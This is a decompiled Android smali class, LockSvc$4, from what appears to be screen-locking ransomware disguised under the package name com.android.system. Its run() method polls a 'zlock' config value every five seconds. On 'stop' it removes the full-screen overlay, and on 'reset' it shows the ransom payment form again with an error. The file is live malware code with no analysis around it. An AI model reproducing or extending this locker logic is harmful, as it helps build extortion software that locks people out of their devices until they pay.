.class Lcom/android/system/LockSvc$4;
.super Ljava/lang/Object;
.source "LockSvc.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/android/system/LockSvc;->MP_Pay(Landroid/view/View;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/android/system/LockSvc;

.field private final synthetic val$RView:Landroid/os/Handler;

.field private final synthetic val$payForm2:Landroid/view/View;


# direct methods
.method constructor <init>(Lcom/android/system/LockSvc;Landroid/view/View;Landroid/os/Handler;)V
    .locals 0

    .prologue
    .line 1
    iput-object p1, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    iput-object p2, p0, Lcom/android/system/LockSvc$4;->val$payForm2:Landroid/view/View;

    iput-object p3, p0, Lcom/android/system/LockSvc$4;->val$RView:Landroid/os/Handler;

    .line 311
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 11

    .prologue
    const/4 v10, 0x0

    .line 315
    new-instance v5, Lcom/android/system/IO;

    invoke-direct {v5}, Lcom/android/system/IO;-><init>()V

    const-string v6, "zlock"

    iget-object v7, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v7}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Lcom/android/system/IO;->readConfig(Ljava/lang/String;Landroid/content/Context;)Ljava/lang/String;

    move-result-object v0

    .line 316
    .local v0, "Check_Key":Ljava/lang/String;
    const-string v5, "stop"

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_0

    .line 317
    new-instance v5, Lcom/android/system/IO;

    invoke-direct {v5}, Lcom/android/system/IO;-><init>()V

    const-string v6, "zlock"

    const-string v7, "fucker"

    iget-object v8, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v8}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-virtual {v5, v6, v7, v8}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 319
    :try_start_0
    iget-object v5, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    iget-object v5, v5, Lcom/android/system/LockSvc;->WM:Landroid/view/WindowManager;

    iget-object v6, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    iget-object v6, v6, Lcom/android/system/LockSvc;->VW:Landroid/view/View;

    invoke-interface {v5, v6}, Landroid/view/WindowManager;->removeView(Landroid/view/View;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    .line 323
    :goto_0
    iget-object v5, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v5}, Lcom/android/system/LockSvc;->stopSelf()V

    .line 326
    :cond_0
    const-string v5, "reset"

    invoke-virtual {v0, v5}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v5

    if-eqz v5, :cond_1

    .line 329
    iget-object v5, p0, Lcom/android/system/LockSvc$4;->val$payForm2:Landroid/view/View;

    .line 330
    iget-object v6, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v6}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v6

    const-string v7, "reseted"

    const-string v8, "id"

    iget-object v9, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v9}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v7, v8, v9}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    invoke-virtual {v5, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v2

    .line 329
    check-cast v2, Landroid/widget/LinearLayout;

    .line 332
    .local v2, "Error":Landroid/widget/LinearLayout;
    iget-object v5, p0, Lcom/android/system/LockSvc$4;->val$payForm2:Landroid/view/View;

    .line 333
    iget-object v6, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v6}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v6

    const-string v7, "payform"

    const-string v8, "id"

    iget-object v9, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v9}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v7, v8, v9}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    invoke-virtual {v5, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v4

    .line 332
    check-cast v4, Landroid/widget/LinearLayout;

    .line 335
    .local v4, "PayForm":Landroid/widget/LinearLayout;
    iget-object v5, p0, Lcom/android/system/LockSvc$4;->val$payForm2:Landroid/view/View;

    .line 336
    iget-object v6, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v6}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v6

    const-string v7, "mp_loaded"

    const-string v8, "id"

    iget-object v9, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v9}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v7, v8, v9}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    invoke-virtual {v5, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v3

    .line 335
    check-cast v3, Landroid/widget/LinearLayout;

    .line 338
    .local v3, "Loaded":Landroid/widget/LinearLayout;
    iget-object v5, p0, Lcom/android/system/LockSvc$4;->val$payForm2:Landroid/view/View;

    .line 339
    iget-object v6, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v6}, Lcom/android/system/LockSvc;->getResources()Landroid/content/res/Resources;

    move-result-object v6

    const-string v7, "mp_code"

    const-string v8, "id"

    iget-object v9, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v9}, Lcom/android/system/LockSvc;->getPackageName()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v6, v7, v8, v9}, Landroid/content/res/Resources;->getIdentifier(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)I

    move-result v6

    invoke-virtual {v5, v6}, Landroid/view/View;->findViewById(I)Landroid/view/View;

    move-result-object v1

    .line 338
    check-cast v1, Landroid/widget/TextView;

    .line 343
    .local v1, "Code":Landroid/widget/TextView;
    invoke-virtual {v4, v10}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 346
    const/16 v5, 0x8

    invoke-virtual {v3, v5}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 349
    invoke-virtual {v2, v10}, Landroid/widget/LinearLayout;->setVisibility(I)V

    .line 351
    const-string v5, ""

    invoke-virtual {v1, v5}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    .line 354
    new-instance v5, Lcom/android/system/IO;

    invoke-direct {v5}, Lcom/android/system/IO;-><init>()V

    const-string v6, "zlock"

    const-string v7, "fucker"

    iget-object v8, p0, Lcom/android/system/LockSvc$4;->this$0:Lcom/android/system/LockSvc;

    invoke-virtual {v8}, Lcom/android/system/LockSvc;->getApplicationContext()Landroid/content/Context;

    move-result-object v8

    invoke-virtual {v5, v6, v7, v8}, Lcom/android/system/IO;->writeConfig(Ljava/lang/String;Ljava/lang/String;Landroid/content/Context;)V

    .line 357
    .end local v1    # "Code":Landroid/widget/TextView;
    .end local v2    # "Error":Landroid/widget/LinearLayout;
    .end local v3    # "Loaded":Landroid/widget/LinearLayout;
    .end local v4    # "PayForm":Landroid/widget/LinearLayout;
    :cond_1
    iget-object v5, p0, Lcom/android/system/LockSvc$4;->val$RView:Landroid/os/Handler;

    const-wide/16 v6, 0x1388

    invoke-virtual {v5, p0, v6, v7}, Landroid/os/Handler;->postDelayed(Ljava/lang/Runnable;J)Z

    .line 358
    return-void

    .line 321
    :catch_0
    move-exception v5

    goto/16 :goto_0
.end method
